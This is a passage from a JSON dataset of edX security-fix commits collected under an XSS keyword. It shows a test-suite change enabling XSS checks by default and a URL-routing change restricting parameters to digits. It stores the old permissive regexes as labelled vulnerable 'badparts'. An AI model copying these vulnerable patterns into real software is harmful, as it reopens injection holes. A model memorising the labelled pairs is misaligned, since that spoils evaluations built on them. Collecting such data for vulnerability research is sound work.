           '--pa11y-reporter=\"1.0-json\" '\n            '--depth-limit=6 '\n        ).format(\n            start_urls=' '.join(start_urls),\n            report_dir=report_dir,\n        )\n        return expected_statement\n\n    def test_default(self):\n        suite = Pa11yCrawler('')\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(suite.pa11y_report_dir, suite.start_urls)\n        )\n\n    def test_get_test_course(self):\n        suite = Pa11yCrawler('')\n        suite.get_test_course()\n        self._mock_sh.assert_has_calls([\n            call(\n                'wget {targz} -O {dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)),\n            call(\n                'tar zxf {dir}demo_course.tar.gz -C {dir}'.format(dir=suite.imports_dir)),\n        ])\n\n    def test_generate_html_reports(self):\n        suite = Pa11yCrawler('')\n        suite.generate_html_reports()\n        self._mock_sh.assert_has_calls([\n            call(\n                'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)),\n        ])\n"}, "/pavelib/utils/test/suites/bokchoy_suite.py": {"changes": [{"diff": "\n         self.default_store = kwargs.get('default_store', None)\n         self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n         self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n-        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))\n+        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))\n         self.extra_args = kwargs.get('extra_args', '')\n         self.har_dir = self.log_dir / 'hars'\n         self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n", "add": 1, "remove": 1, "filename": "/pavelib/utils/test/suites/bokchoy_suite.py", "badparts": ["        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))"], "goodparts": ["        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))"]}], "source": "\n\"\"\" Class used for defining and running Bok Choy acceptance test suite \"\"\" from time import sleep from urllib import urlencode from common.test.acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as path from paver.easy import sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils.test import utils as test_utils import os try: from pygments.console import colorize except ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests Properties(below is a subset): test_dir -parent directory for tests log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style output(xml) fasttest -when set, skip various set-up tasks(e.g., collectstatic) serversonly -prepare and run the necessary servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as per above) and run tests with no setup or cleaning of environment test_spec -when set, specifies test files, classes, cases, etc. See platform doc. default_store -modulestore to use when running tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is that this is less than or equal to the number of available processors. verify_xss -when set, check for XSS vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html \"\"\" def __init__(self, *args, **kwargs): super(BokChoyTestSuite, self).__init__(*args, **kwargs) self.test_dir=Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests') self.log_dir=Env.BOK_CHOY_LOG_DIR self.report_dir=kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR) self.xunit_report=self.report_dir / \"xunit.xml\" self.cache=Env.BOK_CHOY_CACHE self.fasttest=kwargs.get('fasttest', False) self.serversonly=kwargs.get('serversonly', False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False)) self.extra_args=kwargs.get('extra_args', '') self.har_dir=self.log_dir / 'hars' self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE self.imports_dir=kwargs.get('imports_dir', None) self.coveragerc=kwargs.get('coveragerc', None) self.save_screenshots=kwargs.get('save_screenshots', False) def __enter__(self): super(BokChoyTestSuite, self).__enter__() self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly): test_utils.clean_test_files() msg=colorize('green', \"Checking for mongo, memchache, and mysql...\") print msg bokchoy_utils.check_services() if not self.testsonly: self.prepare_bokchoy_run() else: self.load_data() msg=colorize('green', \"Confirming servers have started...\") print msg bokchoy_utils.wait_for_test_servers() try: CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install() print 'Forums permissions/roles data has been seeded' except FixtureError: pass if self.serversonly: self.run_servers_continuously() def __exit__(self, exc_type, exc_value, traceback): super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback) if self.testsonly: msg=colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.') print msg else: msg=colorize('green', \"Cleaning up databases...\") print msg sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\") bokchoy_utils.clear_mongo() def verbosity_processes_string(self): \"\"\" Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct the proper combination for use with nosetests. \"\"\" substring=[] if self.verbosity !=DEFAULT_VERBOSITY and self.num_processes !=DEFAULT_NUM_PROCESSES: msg='Cannot pass in both num_processors and verbosity. Quitting' raise BuildFailure(msg) if self.num_processes !=1: substring=[ \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report), \"--processes={}\".format(self.num_processes), \"--no-color --process-timeout=1200\" ] else: substring=[ \"--with-xunit\", \"--xunit-file={}\".format(self.xunit_report), \"--verbosity={}\".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not specified then static assets are collected \"\"\" sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT)) if not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming servers are running...\") print msg bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the directory that contains the directories that have courses in them. For example, if the course is located in `test_root/courses/test-example-course/`, self.imports_dir should be `test_root/courses/`. \"\"\" msg=colorize('green', \"Importing courses from{}...\".format(self.imports_dir)) print msg if self.imports_dir: sh( \"DEFAULT_STORE={default_store}\" \"./manage.py cms --settings=bok_choy import{import_dir}\".format( default_store=self.default_store, import_dir=self.imports_dir ) ) def load_data(self): \"\"\" Loads data into database from db_fixtures \"\"\" print 'Loading data from json fixtures in db_fixtures directory' sh( \"DEFAULT_STORE={default_store}\" \"./manage.py lms --settings bok_choy loaddata --traceback\" \" common/test/db_fixtures/*.json\".format( default_store=self.default_store, ) ) def run_servers_continuously(self): \"\"\" Infinite loop. Servers will continue to run in the current session unless interrupted. \"\"\" print 'Bok-choy servers running. Press Ctrl-C to exit...\\n' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This method composes the nosetests command to send to the terminal. If nosetests aren't being run, the command returns an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec=self.test_dir / self.test_spec if self.serversonly: return \"\" cmd=[ \"DEFAULT_STORE={}\".format(self.default_store), \"SCREENSHOT_DIR='{}'\".format(self.log_dir), \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir), \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file), \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir), \"VERIFY_XSS='{}'\".format(self.verify_xss), \"nosetests\", test_spec, \"{}\".format(self.verbosity_processes_string()) ] if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save-baseline\") cmd.append(self.extra_args) cmd=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment with mega-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path('test_root/courses/') self.pa11y_report_dir=os.path.join(self.report_dir, 'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course/archive/master.tar.gz\" self.start_urls=[] auto_auth_params={ \"redirect\": 'true', \"staff\": 'true', \"course_id\": self.course_key, } cms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses/v1/blocks/?{}\".format( urlencode({ \"course_id\": self.course_key, \"depth\": \"all\", \"all_blocks\": \"true\", }) ) auto_auth_params.update({'redirect_to': sequence_url}) lms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, self).__enter__() def get_test_course(self): \"\"\" Fetches the test course. \"\"\" self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz' msg=colorize('green', \"Fetching the test course from github...\") print msg sh( 'wget{tar_gz_file} -O{zipped_course}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course...\") print msg sh( 'tar zxf{zipped_course} -C{courses_dir}'.format( zipped_course=zipped_course, courses_dir=self.imports_dir, ) ) def generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"\"\" Runs pa11ycrawler as staff user against the test course. \"\"\" cmd_str=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains={allowed_domains} ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here} ' '--pa11y-reporter=\"{reporter}\" ' '--depth-limit={depth} ' ).format( start_urls=' '.join(self.start_urls), allowed_domains='localhost', report_dir=self.pa11y_report_dir, reporter=\"1.0-json\", dont_go_here=\"logout\", depth=\"6\", ) return cmd_str ", "sourceWithComments": "\"\"\"\nClass used for defining and running Bok Choy acceptance test suite\n\"\"\"\nfrom time import sleep\nfrom urllib import urlencode\n\nfrom common.test.acceptance.fixtures.course import CourseFixture, FixtureError\n\nfrom path import Path as path\nfrom paver.easy import sh, BuildFailure\nfrom pavelib.utils.test.suites.suite import TestSuite\nfrom pavelib.utils.envs import Env\nfrom pavelib.utils.test import bokchoy_utils\nfrom pavelib.utils.test import utils as test_utils\n\nimport os\n\ntry:\n    from pygments.console import colorize\nexcept ImportError:\n    colorize = lambda color, text: text\n\n__test__ = False  # do not collect\n\nDEFAULT_NUM_PROCESSES = 1\nDEFAULT_VERBOSITY = 2\n\n\nclass BokChoyTestSuite(TestSuite):\n    \"\"\"\n    TestSuite for running Bok Choy tests\n    Properties (below is a subset):\n      test_dir - parent directory for tests\n      log_dir - directory for test output\n      report_dir - directory for reports (e.g., coverage) related to test execution\n      xunit_report - directory for xunit-style output (xml)\n      fasttest - when set, skip various set-up tasks (e.g., collectstatic)\n      serversonly - prepare and run the necessary servers, only stopping when interrupted with Ctrl-C\n      testsonly - assume servers are running (as per above) and run tests with no setup or cleaning of environment\n      test_spec - when set, specifies test files, classes, cases, etc. See platform doc.\n      default_store - modulestore to use when running tests (split or draft)\n      num_processes - number of processes or threads to use in tests. Recommendation is that this\n      is less than or equal to the number of available processors.\n      verify_xss - when set, check for XSS vulnerabilities in the page HTML.\n      See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html\n    \"\"\"\n    def __init__(self, *args, **kwargs):\n        super(BokChoyTestSuite, self).__init__(*args, **kwargs)\n        self.test_dir = Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests')\n        self.log_dir = Env.BOK_CHOY_LOG_DIR\n        self.report_dir = kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR)\n        self.xunit_report = self.report_dir / \"xunit.xml\"\n        self.cache = Env.BOK_CHOY_CACHE\n        self.fasttest = kwargs.get('fasttest', False)\n        self.serversonly = kwargs.get('serversonly', False)\n        self.testsonly = kwargs.get('testsonly', False)\n        self.test_spec = kwargs.get('test_spec', None)\n        self.default_store = kwargs.get('default_store', None)\n        self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n        self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))\n        self.extra_args = kwargs.get('extra_args', '')\n        self.har_dir = self.log_dir / 'hars'\n        self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n        self.imports_dir = kwargs.get('imports_dir', None)\n        self.coveragerc = kwargs.get('coveragerc', None)\n        self.save_screenshots = kwargs.get('save_screenshots', False)\n\n    def __enter__(self):\n        super(BokChoyTestSuite, self).__enter__()\n\n        # Ensure that we have a directory to put logs and reports\n        self.log_dir.makedirs_p()\n        self.har_dir.makedirs_p()\n        self.report_dir.makedirs_p()\n        test_utils.clean_reports_dir()      # pylint: disable=no-value-for-parameter\n\n        if not (self.fasttest or self.skip_clean or self.testsonly):\n            test_utils.clean_test_files()\n\n        msg = colorize('green', \"Checking for mongo, memchache, and mysql...\")\n        print msg\n        bokchoy_utils.check_services()\n\n        if not self.testsonly:\n            self.prepare_bokchoy_run()\n        else:\n            # load data in db_fixtures\n            self.load_data()\n\n        msg = colorize('green', \"Confirming servers have started...\")\n        print msg\n        bokchoy_utils.wait_for_test_servers()\n        try:\n            # Create course in order to seed forum data underneath. This is\n            # a workaround for a race condition. The first time a course is created;\n            # role permissions are set up for forums.\n            CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install()\n            print 'Forums permissions/roles data has been seeded'\n        except FixtureError:\n            # this means it's already been done\n            pass\n\n        if self.serversonly:\n            self.run_servers_continuously()\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback)\n\n        # Using testsonly will leave all fixtures in place (Note: the db will also be dirtier.)\n        if self.testsonly:\n            msg = colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.')\n            print msg\n        else:\n            # Clean up data we created in the databases\n            msg = colorize('green', \"Cleaning up databases...\")\n            print msg\n            sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\")\n            bokchoy_utils.clear_mongo()\n\n    def verbosity_processes_string(self):\n        \"\"\"\n        Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct\n        the proper combination for use with nosetests.\n        \"\"\"\n        substring = []\n\n        if self.verbosity != DEFAULT_VERBOSITY and self.num_processes != DEFAULT_NUM_PROCESSES:\n            msg = 'Cannot pass in both num_processors and verbosity. Quitting'\n            raise BuildFailure(msg)\n\n        if self.num_processes != 1:\n            # Construct \"multiprocess\" nosetest substring\n            substring = [\n                \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report),\n                \"--processes={}\".format(self.num_processes),\n                \"--no-color --process-timeout=1200\"\n            ]\n\n        else:\n            substring = [\n                \"--with-xunit\",\n                \"--xunit-file={}\".format(self.xunit_report),\n                \"--verbosity={}\".format(self.verbosity),\n            ]\n\n        return \" \".join(substring)\n\n    def prepare_bokchoy_run(self):\n        \"\"\"\n        Sets up and starts servers for a Bok Choy run. If --fasttest is not\n        specified then static assets are collected\n        \"\"\"\n        sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT))\n\n        if not self.fasttest:\n            self.generate_optimized_static_assets()\n\n        # Clear any test data already in Mongo or MySQLand invalidate\n        # the cache\n        bokchoy_utils.clear_mongo()\n        self.cache.flush_all()\n\n        # load data in db_fixtures\n        self.load_data()\n\n        # load courses if self.imports_dir is set\n        self.load_courses()\n\n        # Ensure the test servers are available\n        msg = colorize('green', \"Confirming servers are running...\")\n        print msg\n        bokchoy_utils.start_servers(self.default_store, self.coveragerc)\n\n    def load_courses(self):\n        \"\"\"\n        Loads courses from self.imports_dir.\n\n        Note: self.imports_dir is the directory that contains the directories\n        that have courses in them. For example, if the course is located in\n        `test_root/courses/test-example-course/`, self.imports_dir should be\n        `test_root/courses/`.\n        \"\"\"\n        msg = colorize('green', \"Importing courses from {}...\".format(self.imports_dir))\n        print msg\n\n        if self.imports_dir:\n            sh(\n                \"DEFAULT_STORE={default_store}\"\n                \" ./manage.py cms --settings=bok_choy import {import_dir}\".format(\n                    default_store=self.default_store,\n                    import_dir=self.imports_dir\n                )\n            )\n\n    def load_data(self):\n        \"\"\"\n        Loads data into database from db_fixtures\n        \"\"\"\n        print 'Loading data from json fixtures in db_fixtures directory'\n        sh(\n            \"DEFAULT_STORE={default_store}\"\n            \" ./manage.py lms --settings bok_choy loaddata --traceback\"\n            \" common/test/db_fixtures/*.json\".format(\n                default_store=self.default_store,\n            )\n        )\n\n    def run_servers_continuously(self):\n        \"\"\"\n        Infinite loop. Servers will continue to run in the current session unless interrupted.\n        \"\"\"\n        print 'Bok-choy servers running. Press Ctrl-C to exit...\\n'\n        print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n'\n\n        while True:\n            try:\n                sleep(10000)\n            except KeyboardInterrupt:\n                print \"Stopping bok-choy servers.\\n\"\n                break\n\n    @property\n    def cmd(self):\n        \"\"\"\n        This method composes the nosetests command to send to the terminal. If nosetests aren't being run,\n         the command returns an empty string.\n        \"\"\"\n        # Default to running all tests if no specific test is specified\n        if not self.test_spec:\n            test_spec = self.test_dir\n        else:\n            test_spec = self.test_dir / self.test_spec\n\n        # Skip any additional commands (such as nosetests) if running in\n        # servers only mode\n        if self.serversonly:\n            return \"\"\n\n        # Construct the nosetests command, specifying where to save\n        # screenshots and XUnit XML reports\n        cmd = [\n            \"DEFAULT_STORE={}\".format(self.default_store),\n            \"SCREENSHOT_DIR='{}'\".format(self.log_dir),\n            \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir),\n            \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file),\n            \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir),\n            \"VERIFY_XSS='{}'\".format(self.verify_xss),\n            \"nosetests\",\n            test_spec,\n            \"{}\".format(self.verbosity_processes_string())\n        ]\n        if self.pdb:\n            cmd.append(\"--pdb\")\n        if self.save_screenshots:\n            cmd.append(\"--with-save-baseline\")\n        cmd.append(self.extra_args)\n\n        cmd = (\" \").join(cmd)\n        return cmd\n\n\nclass Pa11yCrawler(BokChoyTestSuite):\n    \"\"\"\n    Sets up test environment with mega-course loaded, and runs pa11ycralwer\n    against it.\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        super(Pa11yCrawler, self).__init__(*args, **kwargs)\n        self.course_key = kwargs.get('course_key')\n        if self.imports_dir:\n            # If imports_dir has been specified, assume the files are\n            # already there -- no need to fetch them from github. This\n            # allows someome to crawl a different course. They are responsible\n            # for putting it, un-archived, in the directory.\n            self.should_fetch_course = False\n        else:\n            # Otherwise, obey `--skip-fetch` command and use the default\n            # test course.  Note that the fetch will also be skipped when\n            # using `--fast`.\n            self.should_fetch_course = kwargs.get('should_fetch_course')\n            self.imports_dir = path('test_root/courses/')\n\n        self.pa11y_report_dir = os.path.join(self.report_dir, 'pa11ycrawler_reports')\n        self.tar_gz_file = \"https://github.com/edx/demo-test-course/archive/master.tar.gz\"\n\n        self.start_urls = []\n        auto_auth_params = {\n            \"redirect\": 'true',\n            \"staff\": 'true',\n            \"course_id\": self.course_key,\n        }\n        cms_params = urlencode(auto_auth_params)\n        self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params))\n\n        sequence_url = \"/api/courses/v1/blocks/?{}\".format(\n            urlencode({\n                \"course_id\": self.course_key,\n                \"depth\": \"all\",\n                \"all_blocks\": \"true\",\n            })\n        )\n        auto_auth_params.update({'redirect_to': sequence_url})\n        lms_params = urlencode(auto_auth_params)\n        self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params))\n\n    def __enter__(self):\n        if self.should_fetch_course:\n            self.get_test_course()\n        super(Pa11yCrawler, self).__enter__()\n\n    def get_test_course(self):\n        \"\"\"\n        Fetches the test course.\n        \"\"\"\n        self.imports_dir.makedirs_p()\n        zipped_course = self.imports_dir + 'demo_course.tar.gz'\n\n        msg = colorize('green', \"Fetching the test course from github...\")\n        print msg\n\n        sh(\n            'wget {tar_gz_file} -O {zipped_course}'.format(\n                tar_gz_file=self.tar_gz_file,\n                zipped_course=zipped_course,\n            )\n        )\n\n        msg = colorize('green', \"Uncompressing the test course...\")\n        print msg\n\n        sh(\n            'tar zxf {zipped_course} -C {courses_dir}'.format(\n                zipped_course=zipped_course,\n                courses_dir=self.imports_dir,\n            )\n        )\n\n    def generate_html_reports(self):\n        \"\"\"\n        Runs pa11ycrawler json-to-html\n        \"\"\"\n        cmd_str = (\n            'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}'\n        ).format(report_dir=self.pa11y_report_dir)\n\n        sh(cmd_str)\n\n    @property\n    def cmd(self):\n        \"\"\"\n        Runs pa11ycrawler as staff user against the test course.\n        \"\"\"\n        cmd_str = (\n            'pa11ycrawler run {start_urls} '\n            '--pa11ycrawler-allowed-domains={allowed_domains} '\n            '--pa11ycrawler-reports-dir={report_dir} '\n            '--pa11ycrawler-deny-url-matcher={dont_go_here} '\n            '--pa11y-reporter=\"{reporter}\" '\n            '--depth-limit={depth} '\n        ).format(\n            start_urls=' '.join(self.start_urls),\n            allowed_domains='localhost',\n            report_dir=self.pa11y_report_dir,\n            reporter=\"1.0-json\",\n            dont_go_here=\"logout\",\n            depth=\"6\",\n        )\n        return cmd_str\n"}}, "msg": "Enable VERIFY_XSS checking by default."}}, "https://github.com/Dalas/edx": {"4e4c209ae3deb4c78bcec89c181516af8604b450": {"url": "https://api.github.com/repos/Dalas/edx/commits/4e4c209ae3deb4c78bcec89c181516af8604b450", "html_url": "https://github.com/Dalas/edx/commit/4e4c209ae3deb4c78bcec89c181516af8604b450", "sha": "4e4c209ae3deb4c78bcec89c181516af8604b450", "keyword": "XSS malicious", "diff": "diff --git a/lms/urls.py b/lms/urls.py\nindex 776a518599..fe9882b180 100644\n--- a/lms/urls.py\n+++ b/lms/urls.py\n@@ -223,27 +223,27 @@\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n             'staticbook.views.index_shifted'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.pdf_index'),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.html_index', name=\"html_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.html_index'),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n             'courseware.views.index', name=\"courseware\"),\n", "message": "", "files": {"/lms/urls.py": {"changes": [{"diff": "\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n             'staticbook.views.index_shifted'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.pdf_index'),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.html_index', name=\"html_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.html_index'),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n             'courseware.views.index', name=\"courseware\"),\n", "add": 12, "remove": 12, "filename": "/lms/urls.py", "badparts": ["        